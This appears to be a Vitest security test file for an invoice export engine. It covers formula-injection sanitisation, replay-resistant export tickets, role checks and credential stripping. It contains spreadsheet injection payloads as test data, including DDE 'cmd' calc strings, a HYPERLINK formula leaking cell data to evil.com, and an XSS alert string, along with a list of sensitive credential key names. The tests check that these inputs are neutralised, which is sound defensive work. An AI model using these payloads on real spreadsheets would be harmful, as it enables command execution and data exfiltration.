import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import crypto from "node:crypto";
import fs from "node:fs";
import { execSync } from "node:child_process";
import React from "react";
import { render, screen, fireEvent, act } from "@testing-library/react";
import {
  AUTHORITATIVE_COLUMNS,
  CURRENCY_COLUMNS,
  CURRENCY_COLUMN_INDICES,
  sanitizeFormulaInjection,
  stripSensitiveFields,
  isSensitiveKey,
  canExport,
  getExportPermissions,
  ExportTicketManager,
  compileExportRows,
  calculateExportTotals,
  generateExcelXml,
  generateExcelBlob,
  generateDemoCsv,
  type ExportRow,
} from "@/utils/export-engine";
import { data as fixtureData, type Invoice } from "@/data/collectflow";
import { MockSessionProvider, useMockSession } from "@/components/collectflow/session";
import { ExportDrawer, type ExportResult } from "@/components/collectflow/export-drawer";
import type { Role } from "@/data/records";

// Helper components for UI RBAC testing
function SessionHelper({
  role,
  onSessionReady,
}: {
  role: Role;
  onSessionReady?: ((session: ReturnType<typeof useMockSession>) => void) | undefined;
}) {
  const session = useMockSession();
  const init = React.useRef(false);
  React.useEffect(() => {
    if (!init.current) {
      init.current = true;
      if (session.role !== role) session.setRole(role);
    }
  }, [role, session]);
  React.useEffect(() => {
    if (onSessionReady) onSessionReady(session);
  }, [session, onSessionReady]);
  return null;
}

function DrawerWrapper({
  role = "admin",
  children,
  onSessionReady,
}: {
  role?: Role;
  children?: React.ReactNode;
  onSessionReady?: (session: ReturnType<typeof useMockSession>) => void;
}) {
  return React.createElement(
    MockSessionProvider,
    null,
    React.createElement(SessionHelper, { role, onSessionReady }),
    children,
  );
}

describe("Adversarial Challenge 1: Formula Injection (CWE-1236)", () => {
  const maliciousTriggers = [
    { prefix: "=", payload: "=cmd|' /C calc'!A0", desc: "equals formula execution" },
    { prefix: "=", payload: "=SUM(1+1)*cmd|' /C calc'!A0", desc: "equals math formula" },
    {
      prefix: "=",
      payload: '=HYPERLINK("http://evil.com?leak="&A1, "Click")',
      desc: "hyperlink exfiltration",
    },
    { prefix: "+", payload: "+cmd|' /C calc'!A0", desc: "plus formula execution" },
    { prefix: "+", payload: "+123456789", desc: "plus numeric formula" },
    { prefix: "+", payload: "+SUM(A1:B10)", desc: "plus sum formula" },
    { prefix: "-", payload: "-cmd|' /C calc'!A0", desc: "minus formula execution" },
    { prefix: "-", payload: "-5000", desc: "minus numeric formula" },
    { prefix: "-", payload: "-2+3*4", desc: "minus arithmetic formula" },
    { prefix: "@", payload: "@SUM(1+1)", desc: "at-sign formula invocation" },
    { prefix: "@", payload: "@attacker.com", desc: "at-sign domain reference" },
    { prefix: "@", payload: "@cmd|' /C calc'!A0", desc: "at-sign command execution" },
    { prefix: "\t", payload: "\t=cmd|' /C calc'!A0", desc: "tab prefix obfuscation" },
    { prefix: "\t", payload: "\tmalicious_payload", desc: "tab prefix text" },
    { prefix: "\t", payload: "\t+2+2", desc: "tab plus arithmetic" },
    { prefix: "\r", payload: "\r=cmd|' /C calc'!A0", desc: "carriage return formula prefix" },
    { prefix: "\r", payload: "\r\n=1+1", desc: "crlf formula prefix" },
    { prefix: "\r", payload: "\rmalicious_code", desc: "carriage return text" },
  ];

  it("neutralizes every malicious trigger character with single-quote prepending", () => {
    for (const { payload, prefix, desc } of maliciousTriggers) {
      const sanitized = sanitizeFormulaInjection(payload);
      expect(typeof sanitized).toBe("string");
      expect((sanitized as string).startsWith("'"), `Failed for ${desc}: ${payload}`).toBe(true);
      expect(sanitized).toBe(`'${payload}`);
    }
  });

  it("handles non-string types safely without false-positive quoting", () => {
    expect(sanitizeFormulaInjection(531000)).toBe(531000);
    expect(sanitizeFormulaInjection(-42)).toBe(-42); // numeric -42 is a number, not string
    expect(sanitizeFormulaInjection(0)).toBe(0);
    expect(sanitizeFormulaInjection(null)).toBeNull();
    expect(sanitizeFormulaInjection(undefined)).toBeUndefined();
    expect(sanitizeFormulaInjection(true)).toBe(true);
    expect(sanitizeFormulaInjection(false)).toBe(false);
  });

  it("does not mutate safe business strings", () => {
    const safeStrings = [
      "Acme Cloud Solutions Pvt Ltd",
      "INV-2026-042",
      "PO-NEXUS-881",
      "FY 2026-27",
      "Regular Customer Name",
      "100% Guaranteed",
      "",
    ];
    for (const safe of safeStrings) {
      expect(sanitizeFormulaInjection(safe)).toBe(safe);
    }
  });

  it("verifies single quote prepending in Excel XML export across all text columns", () => {
    const maliciousInvoice: Invoice = {
      id: 991,
      fy_code: "=FY_INJECT",
      order_type: "PO",
      po_number: "+PO-CMD-001",
      po_date: "2026-04-15",
      customer_id: 1,
      executive_id: 3,
      customer_name: "@EVIL_CORP",
      customer_gstin: "29AAAAA0000A1Z5",
      customer_address: "\tBangalore HQ",
      customer_state: "Karnataka",
      currency: "INR",
      exchange_rate: 1.0,
      original_amount: 50000.0,
      exclusive_amount: 50000.0,
      tax_rate: 0.18,
      tax_amount: 9000.0,
      total_amount: 59000.0,
      invoice_number: "-INV-MALICIOUS-01",
      invoice_date: "2026-04-16",
      due_date: "2026-05-16",
      remarks: "\rRemarks Injection",
      payment_status: "PENDING",
      total_cash_paid: 0.0,
      total_tds_deducted: 0.0,
      total_paid: 0.0,
      outstanding_balance: 59000.0,
      computed_status: "=STATUS_CMD",
      executive_name: "\tExecutive Attack",
      line_items: [],
      payments: [],
    };

    const rows = compileExportRows([maliciousInvoice], "ALL");
    const xml = generateExcelXml(rows, "ALL");

    // In XML, single quote ' is escaped as &apos;
    // Check that every injected text cell starts with &apos; followed by the trigger
    expect(xml).toContain("&apos;=FY_INJECT");
    expect(xml).toContain("&apos;+PO-CMD-001");
    expect(xml).toContain("&apos;@EVIL_CORP");
    expect(xml).toContain("&apos;-INV-MALICIOUS-01");
    expect(xml).toContain("&apos;=STATUS_CMD");
    expect(xml).toContain("&apos;\tExecutive Attack");

    // Ensure raw unquoted formula prefixes are NOT present in XML Data tags
    expect(xml).not.toContain('<Data ss:Type="String">=FY_INJECT</Data>');
    expect(xml).not.toContain('<Data ss:Type="String">+PO-CMD-001</Data>');
    expect(xml).not.toContain('<Data ss:Type="String">@EVIL_CORP</Data>');
    expect(xml).not.toContain('<Data ss:Type="String">-INV-MALICIOUS-01</Data>');
    expect(xml).not.toContain('<Data ss:Type="String">=STATUS_CMD</Data>');
  });

  it("verifies single quote prepending in Demo CSV export across all columns", () => {
    const maliciousInvoice: Invoice = {
      id: 992,
      fy_code: "=FY_CSV",
      order_type: "PO",
      po_number: "+PO-CSV",
      po_date: "2026-04-15",
      customer_id: 1,
      executive_id: 3,
      customer_name: "@CUSTOMER_CSV",
      customer_gstin: "29AAAAA0000A1Z5",
      customer_address: "Office",
      customer_state: "Karnataka",
      currency: "INR",
      exchange_rate: 1.0,
      original_amount: 50000.0,
      exclusive_amount: 50000.0,
      tax_rate: 0.18,
      tax_amount: 9000.0,
      total_amount: 59000.0,
      invoice_number: "-INV-CSV",
      invoice_date: "2026-04-16",
      due_date: "2026-05-16",
      remarks: "Clean",
      payment_status: "PENDING",
      total_cash_paid: 0.0,
      total_tds_deducted: 0.0,
      total_paid: 0.0,
      outstanding_balance: 59000.0,
      computed_status: "=STATUS_CSV",
      executive_name: "\tEXECUTIVE_CSV",
      line_items: [],
      payments: [],
    };

    const rows = compileExportRows([maliciousInvoice], "ALL");
    const { content } = generateDemoCsv(rows, "ALL");

    // CSV format: values prepended with '
    expect(content).toContain("'=FY_CSV");
    expect(content).toContain("'+PO-CSV");
    expect(content).toContain("'@CUSTOMER_CSV");
    expect(content).toContain("'-INV-CSV");
    expect(content).toContain("'=STATUS_CSV");
    expect(content).toContain("'\tEXECUTIVE_CSV");

    // Ensure raw unquoted triggers do NOT appear at field starts in data rows
    const dataLines = content
      .split("\r\n")
      .filter((l) => !l.startsWith("#") && !l.startsWith("FY"));
    for (const line of dataLines) {
      expect(line).not.toMatch(/(^|,)=/);
      expect(line).not.toMatch(/(^|,)@/);
      expect(line).not.toMatch(/(^|,)\t/);
    }
  });
});

describe("Adversarial Challenge 2: Single-Use Ticket Lifecycle & Replay Attacks", () => {
  let manager: ExportTicketManager;

  beforeEach(() => {
    manager = new ExportTicketManager();
  });

  afterEach(() => {
    vi.useRealTimers();
  });

  it("verifies SHA-256 ticket_hash against Node.js crypto across multiple tickets and test vectors", () => {
    // Generate 50 tickets and compare with Node.js crypto SHA-256 implementation
    for (let i = 0; i < 50; i++) {
      const { ticket, ticket_hash, expires_in } = manager.createTicket(i + 1, "admin");
      expect(ticket).toHaveLength(43);
      expect(expires_in).toBe(300);

      const expectedHash = crypto.createHash("sha256").update(ticket).digest("hex");
      expect(ticket_hash).toBe(expectedHash);
    }

    // Verify SHA-256 hash length and hex format
    const sample = manager.createTicket(1, "finance");
    expect(sample.ticket_hash).toMatch(/^[0-9a-f]{64}$/);
  });

  it("verifies 300s TTL expiration window strictly enforces 5-minute timeout", () => {
    vi.useFakeTimers();
    const baseTime = 1775923200000; // arbitrary fixed epoch
    vi.setSystemTime(baseTime);

    const { ticket } = manager.createTicket(1, "admin");

    // Consuming at T + 299 seconds succeeds
    vi.setSystemTime(baseTime + 299 * 1000);
    // Create another ticket for this exact time
    const { ticket: ticketAt299 } = manager.createTicket(2, "admin");
    const consume299 = manager.consumeTicket(ticketAt299);
    expect(consume299.success).toBe(true);

    // Now test original ticket at T + 300 seconds + 1 millisecond
    vi.setSystemTime(baseTime + 300 * 1000 + 1);
    const expiredAttempt = manager.consumeTicket(ticket);
    expect(expiredAttempt.success).toBe(false);
    expect(expiredAttempt.error).toBe("Export ticket expired (> 5 minutes)");

    // Test ticket at T + 10 minutes
    vi.setSystemTime(baseTime + 600 * 1000);
    const longExpiredAttempt = manager.consumeTicket(ticket);
    expect(longExpiredAttempt.success).toBe(false);
    expect(longExpiredAttempt.error).toBe("Export ticket expired (> 5 minutes)");
  });

  it("strictly enforces single-use consumption and rejects replay attacks", () => {
    const { ticket } = manager.createTicket(1, "admin");

    // Legitimate first download
    const firstConsumption = manager.consumeTicket(ticket);
    expect(firstConsumption.success).toBe(true);
    expect(firstConsumption.ticket?.used).toBe(true);

    // Replay attack 1: Immediate duplicate attempt
    const replay1 = manager.consumeTicket(ticket);
    expect(replay1.success).toBe(false);
    expect(replay1.error).toBe("Invalid, expired, or already consumed export ticket");

    // Replay attack 2: Subsequent duplicate attempt
    const replay2 = manager.consumeTicket(ticket);
    expect(replay2.success).toBe(false);
    expect(replay2.error).toBe("Invalid, expired, or already consumed export ticket");

    // Replay attack 3: Tampered ticket string
    const tampered = manager.consumeTicket(ticket + "MALICIOUS");
    expect(tampered.success).toBe(false);
    expect(tampered.error).toBe("Invalid export ticket");

    // Reset ticket manager invalidates all existing tickets
    manager.reset();
    const afterReset = manager.consumeTicket(ticket);
    expect(afterReset.success).toBe(false);
    expect(afterReset.error).toBe("Invalid export ticket");
  });

  it("rejects concurrent multiple consumptions (atomic single-use stress test)", () => {
    const { ticket } = manager.createTicket(1, "finance");

    // Simulate 30 rapid sequential/concurrent consumption requests on the same ticket
    const results = Array.from({ length: 30 }, () => manager.consumeTicket(ticket));
    const successful = results.filter((r) => r.success);
    const failed = results.filter((r) => !r.success);

    expect(successful).toHaveLength(1);
    expect(failed).toHaveLength(29);
    for (const fail of failed) {
      expect(fail.error).toBe("Invalid, expired, or already consumed export ticket");
    }
  });
});

describe("Adversarial Challenge 3: RBAC & Sensitive Data Sanitization", () => {
  describe("RBAC Permissions Matrix", () => {
    it("allows full export generation strictly for Admin and Finance roles", () => {
      expect(canExport("admin")).toBe(true);
      expect(canExport("finance")).toBe(true);

      const adminPerms = getExportPermissions("admin");
      expect(adminPerms.allowed).toBe(true);
      expect(adminPerms.canDownload).toBe(true);
      expect(adminPerms.canPreview).toBe(true);

      const financePerms = getExportPermissions("finance");
      expect(financePerms.allowed).toBe(true);
      expect(financePerms.canDownload).toBe(true);
      expect(financePerms.canPreview).toBe(true);
    });

    it("strictly blocks export generation for Viewer, Sales, and unauthorized roles", () => {
      const unauthorizedRoles = ["viewer", "sales", "auditor", "guest", "", "ADMIN", "Finance"];
      for (const role of unauthorizedRoles) {
        expect(canExport(role)).toBe(false);

        const perms = getExportPermissions(role);
        expect(perms.allowed).toBe(false);
        expect(perms.canDownload).toBe(false);
        expect(perms.canPreview).toBe(true);
        expect(perms.reason).toContain("restricted to Admin and Finance roles");
      }
    });

    it("renders permission denial alert and disables confirm button when role is Sales", () => {
      render(
        React.createElement(
          DrawerWrapper,
          { role: "sales" },
          React.createElement(ExportDrawer, { close: () => {} }),
        ),
      );

      // Denial alert banner present
      const alert = screen.getByRole("alert");
      expect(alert).toBeDefined();
      expect(alert.textContent).toContain(
        "Only Admin and Finance roles have full export generation access",
      );

      // Navigate to step 4
      fireEvent.click(screen.getByText("Continue to Preview"));
      fireEvent.click(screen.getByText("Review Columns & Totals"));
      fireEvent.click(screen.getByText("Proceed to Confirmation"));

      // Confirm button is disabled
      const confirmBtn = screen.getByText("Confirm & Generate Excel Export");
      expect(confirmBtn).toBeDisabled();
    });

    it("renders permission denial alert and disables confirm button when role is Viewer", () => {
      render(
        React.createElement(
          DrawerWrapper,
          { role: "viewer" },
          React.createElement(ExportDrawer, { close: () => {} }),
        ),
      );

      // Denial alert banner present
      const alert = screen.getByRole("alert");
      expect(alert).toBeDefined();
      expect(alert.textContent).toContain(
        "Only Admin and Finance roles have full export generation access",
      );

      // Navigate to step 4
      fireEvent.click(screen.getByText("Continue to Preview"));
      fireEvent.click(screen.getByText("Review Columns & Totals"));
      fireEvent.click(screen.getByText("Proceed to Confirmation"));

      // Confirm button is disabled
      const confirmBtn = screen.getByText("Confirm & Generate Excel Export");
      expect(confirmBtn).toBeDisabled();
    });

    it("reacts immediately to mid-workflow role demotion from Admin to Sales", () => {
      let sessionRef: ReturnType<typeof useMockSession> | null = null;
      render(
        React.createElement(
          DrawerWrapper,
          {
            role: "admin",
            onSessionReady: (s) => {
              sessionRef = s;
            },
          },
          React.createElement(ExportDrawer, { close: () => {} }),
        ),
      );

      // Navigate to Confirm step as Admin
      fireEvent.click(screen.getByText("Continue to Preview"));
      fireEvent.click(screen.getByText("Review Columns & Totals"));
      fireEvent.click(screen.getByText("Proceed to Confirmation"));

      // Confirm button is initially enabled for Admin
      const confirmBtn = screen.getByText("Confirm & Generate Excel Export");
      expect(confirmBtn).not.toBeDisabled();
      expect(screen.queryByRole("alert")).toBeNull();

      // Adversarial attack: Role changed mid-workflow to Sales
      act(() => {
        sessionRef?.setRole("sales");
      });

      // Denial alert appears immediately
      const alert = screen.getByRole("alert");
      expect(alert).toBeDefined();
      expect(alert.textContent).toContain("Simulated role changed to sales");

      // Confirm button is immediately disabled
      expect(confirmBtn).toBeDisabled();
    });
  });

  describe("Sensitive Data Sanitization & Credential Stripping", () => {
    it("identifies all sensitive credential key patterns", () => {
      const sensitiveKeys = [
        "password",
        "PASSWORD",
        "PassWord",
        "user_password",
        "password_hash",
        "pass_hash",
        "hashed_password",
        "salt",
        "user_salt",
        "secret",
        "client_secret",
        "secret_key",
        "token",
        "auth_token",
        "access_token",
        "refresh_token",
        "session_token",
        "api_key",
        "private_key",
        "credential",
      ];

      for (const key of sensitiveKeys) {
        expect(isSensitiveKey(key), `Expected ${key} to be flagged as sensitive`).toBe(true);
      }

      const nonSensitiveKeys = [
        "customer_name",
        "invoice_number",
        "po_number",
        "total_amount",
        "exclusive_amount",
        "status",
        "fy_code",
        "due_date",
      ];
      for (const key of nonSensitiveKeys) {
        expect(isSensitiveKey(key), `Expected ${key} to NOT be flagged as sensitive`).toBe(false);
      }
    });

    it("recursively strips sensitive credentials from arbitrary objects", () => {
      const payloadWithSecrets = {
        id: 1,
        username: "admin",
        role: "admin",
        password: "super_secret_password_123",
        password_hash: "a".repeat(64),
        salt: "pepper_salt_99",
        session_token: "jwt_token_xyz",
        api_key: "api_live_12345",
        metadata: {
          client_secret: "nested_secret",
          refresh_token: "nested_refresh",
          safe_field: "Safe Metadata Value",
        },
      };

      const sanitized = stripSensitiveFields(payloadWithSecrets) as Record<string, unknown>;

      expect(sanitized["password"]).toBeUndefined();
      expect(sanitized["password_hash"]).toBeUndefined();
      expect(sanitized["salt"]).toBeUndefined();
      expect(sanitized["session_token"]).toBeUndefined();
      expect(sanitized["api_key"]).toBeUndefined();

      const nested = sanitized["metadata"] as Record<string, unknown>;
      expect(nested["client_secret"]).toBeUndefined();
      expect(nested["refresh_token"]).toBeUndefined();
      expect(nested["safe_field"]).toBe("Safe Metadata Value");
    });

    it("ensures zero sensitive credentials leak into compiled export rows and artifacts", () => {
      // Create invoice record contaminated with sensitive metadata
      const contaminatedInvoice = {
        ...fixtureData.invoices[0],
        password: "leaked_invoice_password",
        password_hash: "deadbeef".repeat(8),
        auth_token: "leaked_bearer_token",
        secret_salt: "leaked_salt_123",
      } as unknown as Invoice;

      const compiledRows = compileExportRows([contaminatedInvoice], "ALL");
      expect(compiledRows).toHaveLength(1);

      const row = compiledRows[0] as unknown as Record<string, unknown>;

      // Check all keys in the compiled row: must match AUTHORITATIVE_COLUMNS exactly
      const rowKeys = Object.keys(row);
      expect(rowKeys.sort()).toEqual([...AUTHORITATIVE_COLUMNS].sort());

      // Assert no secret keys present in row
      expect(row["password"]).toBeUndefined();
      expect(row["password_hash"]).toBeUndefined();
      expect(row["auth_token"]).toBeUndefined();
      expect(row["secret_salt"]).toBeUndefined();

      // Assert no secret values present in generated XML
      const xml = generateExcelXml(compiledRows, "ALL");
      expect(xml).not.toContain("leaked_invoice_password");
      expect(xml).not.toContain("leaked_bearer_token");
      expect(xml).not.toContain("leaked_salt_123");

      // Assert no secret values present in generated CSV
      const csv = generateDemoCsv(compiledRows, "ALL");
      expect(csv.content).not.toContain("leaked_invoice_password");
      expect(csv.content).not.toContain("leaked_bearer_token");
      expect(csv.content).not.toContain("leaked_salt_123");
    });
  });

  describe("Deep Stress: XML Well-Formedness & Complex CSV RFC-4180 Escaping", () => {
    it("guarantees valid XML DOM well-formedness with zero parser errors even under extreme payloads", () => {
      const extremeInvoice: Invoice = {
        id: 777,
        fy_code: "FY 2026-27",
        order_type: "PO",
        po_number: "=cmd|' /C calc <>&\"'!A0",
        po_date: "2026-04-20",
        customer_id: 1,
        executive_id: 3,
        customer_name: '@attacker <xml_tag> &amp; "quote"',
        customer_gstin: "29AAAAA0000A1Z5",
        customer_address: "Address",
        customer_state: "Karnataka",
        currency: "INR",
        exchange_rate: 1.0,
        original_amount: 100000.0,
        exclusive_amount: 100000.0,
        tax_rate: 0.18,
        tax_amount: 18000.0,
        total_amount: 118000.0,
        invoice_number: "-INV-<script>alert(1)</script>",
        invoice_date: "2026-04-21",
        due_date: "2026-05-21",
        remarks: "Normal",
        payment_status: "PENDING",
        total_cash_paid: 0.0,
        total_tds_deducted: 0.0,
        total_paid: 0.0,
        outstanding_balance: 118000.0,
        computed_status: "+PENDING",
        executive_name: "\tNeha & Sons <Pvt Ltd>",
        line_items: [],
        payments: [],
      };

      const rows = compileExportRows([extremeInvoice], "ALL");
      const xml = generateExcelXml(rows, "ALL");

      // Parse with DOMParser in JSDOM
      const parser = new DOMParser();
      const doc = parser.parseFromString(xml, "text/xml");
      const parserErrors = doc.getElementsByTagName("parsererror");
      expect(parserErrors.length).toBe(0);

      // Verify Worksheet and Table elements exist
      const worksheet = doc.getElementsByTagName("Worksheet")[0];
      expect(worksheet).toBeDefined();
      expect(worksheet?.getAttribute("ss:Name")).toBe("Invoices & Collections");

      // Verify decoded data content inside cells
      const dataNodes = doc.getElementsByTagName("Data");
      const textContents = Array.from(dataNodes).map((node) => node.textContent);

      // Should have decoded single quote prepended text
      expect(textContents).toContain("'=cmd|' /C calc <>&\"'!A0");
      expect(textContents).toContain('\'@attacker <xml_tag> &amp; "quote"');
      expect(textContents).toContain("'-INV-<script>alert(1)</script>");
      expect(textContents).toContain("'+PENDING");
      expect(textContents).toContain("'\tNeha & Sons <Pvt Ltd>");
    });

    it("verifies ticket collision resistance and entropy across 500 generated tickets", () => {
      const manager = new ExportTicketManager();
      const ticketSet = new Set<string>();
      const hashSet = new Set<string>();

      for (let i = 0; i < 500; i++) {
        const { ticket, ticket_hash } = manager.createTicket(i + 1, "admin");
        ticketSet.add(ticket);
        hashSet.add(ticket_hash);
      }

      // Zero collisions
      expect(ticketSet.size).toBe(500);
      expect(hashSet.size).toBe(500);
    });

    it("verifies genuine XLSX binary package neutralizes adversarial formula injection when read by openpyxl (CF6-P01)", () => {
      const hostileInvoice: Invoice = {
        id: 778,
        fy_code: "=DANGEROUS()",
        order_type: "PO",
        po_number: "+PO-CMD-EXEC",
        po_date: "2026-04-20",
        customer_id: 1,
        executive_id: 3,
        customer_name: "@hostile_customer",
        customer_gstin: "29AAAAA0000A1Z5",
        customer_address: "\tAddress Tabbed",
        customer_state: "Karnataka",
        currency: "INR",
        exchange_rate: 1.0,
        original_amount: 100000.0,
        exclusive_amount: 100000.0,
        tax_rate: 0.18,
        tax_amount: 18000.0,
        total_amount: 118000.0,
        invoice_number: "-INV-POISON",
        invoice_date: "2026-04-21",
        due_date: "2026-05-21",
        remarks: "Normal",
        payment_status: "PENDING",
        total_cash_paid: 0.0,
        total_tds_deducted: 0.0,
        total_paid: 0.0,
        outstanding_balance: 118000.0,
        computed_status: "=STATUS_EXPLOIT",
        executive_name: "\rCarriage Return Executive",
        line_items: [],
        payments: [],
      };

      const rows = compileExportRows([hostileInvoice], "ALL");
      const { bytes } = generateExcelBlob(rows, "ALL");

      // Verify ZIP magic bytes
      expect(bytes[0]).toBe(0x50);
      expect(bytes[1]).toBe(0x4b);

      const tmpPath = "/tmp/collectflow_adversarial_openpyxl.xlsx";
      fs.writeFileSync(tmpPath, bytes);

      const pyScript = `import openpyxl

wb = openpyxl.load_workbook('${tmpPath}')
ws = wb.active

# Row 2 contains hostile values prepended with single quote
fy = ws.cell(2, 1).value
po_num = ws.cell(2, 3).value
cust = ws.cell(2, 4).value
inv = ws.cell(2, 9).value
status = ws.cell(2, 16).value

assert fy == "'=DANGEROUS()", f"FY mismatch: {fy}"
assert po_num == "'+PO-CMD-EXEC", f"PO mismatch: {po_num}"
assert cust == "'@hostile_customer", f"Customer mismatch: {cust}"
assert inv == "'-INV-POISON", f"Invoice mismatch: {inv}"
assert status == "'=STATUS_EXPLOIT", f"Status mismatch: {status}"

print('ADVERSARIAL_OPENPYXL_SUCCESS')
`;
      const pyScriptPath = "/tmp/collectflow_verify_adversarial.py";
      fs.writeFileSync(pyScriptPath, pyScript);
      const pyOutput = execSync(`python3 ${pyScriptPath}`).toString().trim();
      expect(pyOutput).toBe("ADVERSARIAL_OPENPYXL_SUCCESS");
    });
  });
});
